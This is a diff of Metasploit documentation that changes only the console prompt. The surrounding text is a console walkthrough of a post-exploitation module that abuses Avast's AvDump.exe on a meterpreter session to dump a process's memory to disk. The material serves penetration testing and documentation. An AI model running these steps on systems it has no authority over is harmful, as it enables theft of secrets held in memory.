@@ -32,7 +32,7 @@ Specify the location to write the memory dump to.
 
 ### Windows 10 (2004 OS Build 19041.572)
 ```
-msf5 > search avast
+msf > search avast
 
 Matching Modules
 ================
@@ -42,9 +42,9 @@ Matching Modules
    0  post/windows/gather/avast_memory_dump                   normal  No     Avast AV Memory Dumping Utility
 
 
-msf5 > use 0
+msf > use 0
 
-msf5 post(windows/gather/avast_memory_dump) > sessions -C 'ps -N notepad.exe'
+msf post(windows/gather/avast_memory_dump) > sessions -C 'ps -N notepad.exe'
 [*] Running 'ps -N notepad.exe' on meterpreter session 4 (192.168.218.131)
 Filtering on 'notepad.exe'
 
@@ -55,7 +55,7 @@ Process List
  ---   ----  ----         ----  -------  ----                  ----
  8504  1812  notepad.exe  x64   1        DESKTOP-CD2VHVO\user  C:\Windows\System32\notepad.exe
 
-msf5 post(windows/gather/avast_memory_dump) > show options
+msf post(windows/gather/avast_memory_dump) > show options
 
 Module options (post/windows/gather/avast_memory_dump):
 
@@ -65,13 +65,13 @@ Module options (post/windows/gather/avast_memory_dump):
    PID        8504                      yes       specify pid to dump
    SESSION    4                         yes       The session to run this module on.
    
-msf5 post(windows/gather/avast_memory_dump) > set PID 8504
+msf post(windows/gather/avast_memory_dump) > set PID 8504
 PID => 8504
 
-msf5 post(windows/gather/avast_memory_dump) > set SESSION 4
+msf post(windows/gather/avast_memory_dump) > set SESSION 4
 SESSION => 4
 
-msf5 post(windows/gather/avast_memory_dump) > run
+msf post(windows/gather/avast_memory_dump) > run
 
 [*] [2020.10.21-22:49:24] AvDump.exe exists!
 [*] [2020.10.21-22:49:24] executing Avast mem dump utility against 8504 to C:\Users\Public\test.dmp
